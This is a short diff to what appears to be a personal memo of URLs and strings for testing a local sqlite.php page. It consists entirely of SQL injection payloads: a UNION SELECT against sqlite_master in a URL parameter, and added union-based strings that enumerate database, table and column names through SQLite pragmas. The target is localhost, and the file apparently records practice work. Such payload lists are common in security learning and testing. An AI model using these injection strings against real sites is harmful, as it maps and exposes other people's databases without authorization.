@@ -1,2 +1,11 @@
 #this is just some url(s) memo:
 http://127.0.0.1/sqlite.php?a=%27union+select+1,+sql+from+sqlite_master+;+--
+
+DATABASE_NAMES
+' union select name, null from pragma_database_list; -- --
+
+TABLES_NAMES
+' union select name, null from pragma_table_list; -- --
+
+COLUMN_NAMES
+' union select name, null from pragma_table_info("list"); -- --
